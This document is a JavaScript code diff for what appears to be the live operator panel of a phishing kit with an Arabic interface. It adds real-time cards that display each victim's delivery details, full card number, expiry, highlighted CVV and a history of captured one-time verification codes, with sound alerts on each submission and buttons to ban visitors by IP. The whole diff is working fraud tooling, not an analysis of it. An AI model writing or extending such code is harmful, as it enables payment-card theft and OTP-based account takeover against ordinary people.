@@ -256,37 +256,43 @@ function setupSocketListeners() {
 
   socket.on('form:deliverySubmitted', (data) => {
     console.log('📦 DATA RECEIVED VIA SOCKET (form:deliverySubmitted):', data);
+    const sessionId = data.session_id || data.sessionId;
+    
     // Play sound ONLY for actual submission - with spam protection
-    const sessionId = data.session_id || 'unknown';
     if (shouldPlaySound(sessionId, 'delivery')) {
       sounds.formDelivery();
     }
-    // Smart update: only update this card and move to top
-    updateCardAndMoveToTop(sessionId, data);
+    
+    // Update or create card, then move to top
+    processVisitorUpdate(sessionId, data);
     updateStats();
   });
 
   socket.on('form:paymentSubmitted', (data) => {
     console.log('💳 DATA RECEIVED VIA SOCKET (form:paymentSubmitted):', data);
+    const sessionId = data.session_id || data.sessionId;
+    
     // Play sound ONLY for actual submission - with spam protection
-    const sessionId = data.session_id || 'unknown';
     if (shouldPlaySound(sessionId, 'payment')) {
       sounds.formPayment();
     }
-    // Smart update: only update this card and move to top
-    updateCardAndMoveToTop(sessionId, data);
+    
+    // Update or create card, then move to top
+    processVisitorUpdate(sessionId, data);
     updateStats();
   });
 
   socket.on('form:verificationSubmitted', (data) => {
     console.log('🔐 DATA RECEIVED VIA SOCKET (form:verificationSubmitted):', data);
+    const sessionId = data.session_id || data.sessionId;
+    
     // Play sound ONLY for actual submission - with spam protection
-    const sessionId = data.session_id || 'unknown';
     if (shouldPlaySound(sessionId, 'verification')) {
       sounds.formVerification();
     }
-    // Smart update: only update this card and move to top
-    updateCardAndMoveToTop(sessionId, data);
+    
+    // Update or create card, then move to top
+    processVisitorUpdate(sessionId, data);
     updateStats();
   });
 
@@ -986,26 +992,289 @@ function moveCardToTop(sessionId) {
   }
 }
 
-// Update card data and move to top (for real-time form updates)
-function updateCardAndMoveToTop(sessionId, data) {
-  // First move to top immediately for visibility
-  moveCardToTop(sessionId);
+// Main function to process any visitor update - creates or updates card
+function processVisitorUpdate(sessionId, data) {
+  if (!sessionId) {
+    console.error('❌ No sessionId in update data');
+    return;
+  }
   
-  // Then update the card with new data
-  // If card doesn't exist, trigger full refresh
-  const card = document.querySelector('[data-session="' + sessionId + '"]');
+  const grid = document.getElementById('visitorsGrid');
+  if (!grid) {
+    console.error('❌ visitorsGrid not found');
+    return;
+  }
+  
+  // Find existing card
+  let card = document.querySelector('[data-session="' + sessionId + '"]');
+  
   if (card) {
-    // Update the existing card with new data
-    updateVisitorCardData(card, data);
-    // Add highlight animation to show update
-    card.style.boxShadow = '0 0 20px var(--primary)';
+    // Update existing card with full data
+    console.log('📝 Updating existing card for:', sessionId);
+    updateVisitorCardFull(card, data);
+    
+    // Move to top with animation
+    moveCardToTop(sessionId);
+    
+    // Add highlight animation
+    card.style.boxShadow = '0 0 25px var(--primary)';
     setTimeout(() => {
       card.style.boxShadow = '';
-    }, 500);
+    }, 600);
+    
   } else {
-    // Card not found - request full refresh
-    updateVisitorsList();
+    // Create NEW card for this visitor
+    console.log('🆕 Creating new card for:', sessionId);
+    createVisitorCardElement(data, grid);
+    
+    // Move the new card to top
+    setTimeout(() => {
+      const newCard = document.querySelector('[data-session="' + sessionId + '"]');
+      if (newCard) {
+        moveCardToTop(sessionId);
+        // Highlight animation for new card
+        newCard.style.boxShadow = '0 0 25px var(--accent)';
+        setTimeout(() => {
+          newCard.style.boxShadow = '';
+        }, 600);
+      }
+    }, 50);
   }
+  
+  // Update cache
+  visitorsCache.set(sessionId, data);
+}
+
+// Create a visitor card element and append to grid
+function createVisitorCardElement(data, grid) {
+  const sessionId = data.session_id || data.sessionId;
+  if (!sessionId) return;
+  
+  // Create card element
+  const card = document.createElement('div');
+  card.className = 'visitor-card';
+  card.setAttribute('data-session', sessionId);
+  card.setAttribute('data-online', data.is_online === true);
+  
+  // Get visitor name for display
+  let displayName = data.delivery_data?.fullName || 
+                    data.payment_data?.cardHolder || 
+                    data.name || 
+                    'زائر ' + sessionId.substring(0, 6);
+  
+  // Get phone for display
+  let displayPhone = data.delivery_data?.phone || data.phone || '';
+  
+  // Status text
+  let statusText = data.is_online === true ? 'متصل الآن' : 'غير متصل';
+  let statusIcon = data.is_online === true ? '' : ' offline';
+  
+  // Time ago
+  let timeAgo = formatTimeAgo(new Date(data.last_activity || Date.now()));
+  
+  // Current page
+  let currentPage = getPageName(data.current_page || 'home');
+  
+  // Build card HTML
+  card.innerHTML = `
+    <div class="card-header" style="${data.is_online === true ? 'background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);' : 'background: linear-gradient(135deg, #6b7280 0%, #4b5563 100%);'}">
+      <div class="card-title">${escapeHtml(displayName)}</div>
+      <div class="card-status"><span class="dot${statusIcon}"></span><span>${statusText}</span></div>
+    </div>
+    <div class="card-body">
+      <div class="card-meta">
+        <span class="card-page">${currentPage}</span>
+        <span class="card-time">${timeAgo}</span>
+      </div>
+      ${displayPhone ? '<div class="data-row"><span class="data-label">الهاتف</span><span class="data-value">' + escapeHtml(displayPhone) + '</span></div>' : ''}
+      ${data.form_submitted ? '<div class="progress-step completed"><span class="step-icon">✓</span> نموذج التوصيل</div>' : ''}
+      ${data.payment_submitted ? '<div class="progress-step completed"><span class="step-icon">✓</span> الدفع</div>' : ''}
+      ${data.verification_submitted ? '<div class="progress-step completed"><span class="step-icon">✓</span> التحقق</div>' : ''}
+    </div>
+    <div class="card-actions">
+      <button class="btn btn-sm btn-primary" onclick="viewVisitorDetails('${sessionId}')">عرض</button>
+      <button class="btn btn-sm btn-danger" onclick="banVisitor('${sessionId}', '${escapeHtml(data.ip_address || '')}')">🚫</button>
+    </div>
+  `;
+  
+  // Add to grid at top
+  if (grid.firstChild) {
+    grid.insertBefore(card, grid.firstChild);
+  } else {
+    grid.appendChild(card);
+  }
+  
+  // Animate in
+  card.style.opacity = '0';
+  card.style.transform = 'translateY(-20px)';
+  requestAnimationFrame(() => {
+    card.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+    card.style.opacity = '1';
+    card.style.transform = 'translateY(0)';
+  });
+}
+
+// Update existing card with full data
+function updateVisitorCardFull(card, data) {
+  if (!card || !data) return;
+  
+  const sessionId = data.session_id || data.sessionId;
+  
+  // Update data attributes
+  card.setAttribute('data-online', data.is_online === true);
+  
+  // Update header
+  const header = card.querySelector('.card-header');
+  if (header) {
+    header.style.background = data.is_online === true 
+      ? 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)' 
+      : 'linear-gradient(135deg, #6b7280 0%, #4b5563 100%)';
+  }
+  
+  // Update status
+  const statusEl = card.querySelector('.card-status');
+  if (statusEl) {
+    statusEl.innerHTML = data.is_online === true 
+      ? '<span class="dot"></span><span>متصل الآن</span>' 
+      : '<span class="dot offline"></span><span>غير متصل</span>';
+  }
+  
+  // Update display name
+  const displayName = data.delivery_data?.fullName || 
+                      data.payment_data?.cardHolder || 
+                      data.name || 
+                      'زائر ' + (sessionId ? sessionId.substring(0, 6) : '');
+  const titleEl = card.querySelector('.card-title');
+  if (titleEl) titleEl.textContent = displayName;
+  
+  // Update page
+  const pageEl = card.querySelector('.card-page');
+  if (pageEl && data.current_page) {
+    pageEl.textContent = getPageName(data.current_page);
+  }
+  
+  // Update time
+  const timeEl = card.querySelector('.card-time');
+  if (timeEl && data.last_activity) {
+    timeEl.textContent = formatTimeAgo(new Date(data.last_activity));
+  }
+  
+  // Update phone if available
+  const phone = data.delivery_data?.phone || data.phone;
+  let phoneRow = card.querySelector('.data-row:has(.data-label)')?.closest('.data-row');
+  if (phone) {
+    if (phoneRow) {
+      phoneRow.querySelector('.data-value').textContent = phone;
+    } else {
+      const metaEl = card.querySelector('.card-meta');
+      if (metaEl) {
+        metaEl.insertAdjacentHTML('afterend', '<div class="data-row"><span class="data-label">الهاتف</span><span class="data-value">' + escapeHtml(phone) + '</span></div>');
+      }
+    }
+  }
+  
+  // Update progress steps
+  if (data.form_submitted) {
+    let deliveryStep = card.querySelector('.progress-step:not(.completed)');
+    if (deliveryStep) {
+      deliveryStep.classList.add('completed');
+      deliveryStep.querySelector('.step-icon').textContent = '✓';
+    } else if (!card.querySelector('.progress-step')) {
+      const body = card.querySelector('.card-body');
+      if (body) {
+        body.insertAdjacentHTML('beforeend', '<div class="progress-step completed"><span class="step-icon">✓</span> نموذج التوصيل</div>');
+      }
+    }
+  }
+  
+  if (data.payment_submitted) {
+    let paymentStep = card.querySelector('.progress-step:not(.completed)');
+    if (paymentStep) {
+      paymentStep.classList.add('completed');
+      paymentStep.querySelector('.step-icon').textContent = '✓';
+    }
+  }
+  
+  // Update delivery data section
+  if (data.delivery_data) {
+    updateCardSection(card, 'delivery', buildDeliverySection(data.delivery_data));
+  }
+  
+  // Update payment data section
+  if (data.payment_data) {
+    updateCardSection(card, 'payment', buildPaymentSection(data.payment_data));
+  }
+  
+  // Update OTP section
+  if (data.verification_data || data.otp_history) {
+    const otp = data.verification_data?.otp || (data.otp_history?.[0]?.otp);
+    if (otp) {
+      updateCardSection(card, 'otp', buildOtpSection(otp, data.otp_history || [], sessionId));
+    }
+  }
+}
+
+// Helper: Update or insert a section in card
+function updateCardSection(card, sectionClass, html) {
+  const existing = card.querySelector('.card-section.' + sectionClass + '-section');
+  const body = card.querySelector('.card-body');
+  
+  if (existing) {
+    existing.outerHTML = html;
+  } else if (body) {
+    body.insertAdjacentHTML('beforeend', html);
+  }
+}
+
+// Helper: Build delivery section HTML
+function buildDeliverySection(data) {
+  let html = '<div class="card-section delivery-section"><div class="section-title"><span>📦</span> بيانات التوصيل</div>';
+  if (data.fullName) html += '<div class="data-row"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(data.fullName) + '</span></div>';
+  if (data.phone) html += '<div class="data-row"><span class="data-label">الهاتف</span><span class="data-value">' + escapeHtml(data.phone) + '</span></div>';
+  if (data.email) html += '<div class="data-row"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(data.email) + '</span></div>';
+  if (data.city) html += '<div class="data-row"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(data.city) + '</span></div>';
+  if (data.address) html += '<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(data.address) + '</span></div>';
+  html += '</div>';
+  return html;
+}
+
+// Helper: Build payment section HTML
+function buildPaymentSection(data) {
+  const cardNum = data.cardNumber || data.card_number || '';
+  const cvv = data.cvv || '';
+  let html = '<div class="card-section payment-section"><div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>';
+  if (cardNum) html += '<div class="data-row"><span class="data-label">البطاقة</span><span class="data-value">' + escapeHtml(cardNum) + '</span></div>';
+  if (data.cardHolder) html += '<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(data.cardHolder) + '</span></div>';
+  if (data.expiry) html += '<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">' + escapeHtml(data.expiry) + '</span></div>';
+  if (cvv) html += '<div class="data-row"><span class="data-label">CVV</span><span class="data-value highlight">' + escapeHtml(cvv) + '</span></div>';
+  html += '</div>';
+  return html;
+}
+
+// Helper: Build OTP section HTML
+function buildOtpSection(otp, history, sessionId) {
+  let historyHtml = '';
+  if (history.length > 1) {
+    const oldOtps = history.slice(1).map(item => 
+      '<div class="otp-history-item">السابق: <strong>' + item.otp + '</strong></div>'
+    ).join('');
+    historyHtml = '<div class="otp-history-dropdown" id="otpHistory_' + sessionId + '">' + oldOtps + '</div>';
+  }
+  return '<div class="card-section otp-section"><div class="section-title" style="cursor:pointer;" onclick="toggleOtpHistory(\'' + sessionId + '\')"><span>🔐</span> رمز التحقق (OTP)' + (history.length > 1 ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + history.length + ' رمز</span>' : '') + '</div><div class="otp-value">' + otp + '</div>' + historyHtml + '</div>';
+}
+
+// Escape HTML to prevent XSS
+function escapeHtml(text) {
+  if (!text) return '';
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+// Update card data and move to top (for real-time form updates)
+function updateCardAndMoveToTop(sessionId, data) {
+  // Use the main processing function
+  processVisitorUpdate(sessionId, data);
 }
 
 // Update card with new data (inline update, no full rebuild)
@@ -1764,6 +2033,10 @@ async function validateAdminSession() {
 // Export functions
 window.showTab = showTab;
 window.toggleSound = toggleSound;
+window.processVisitorUpdate = processVisitorUpdate;
+window.createVisitorCardElement = createVisitorCardElement;
+window.updateVisitorCardFull = updateVisitorCardFull;
+window.viewVisitorDetails = viewVisitorDetails;
 window.banVisitor = banVisitor;
 window.unbanUser = unbanUser;
 window.loadBannedUsers = loadBannedUsers;
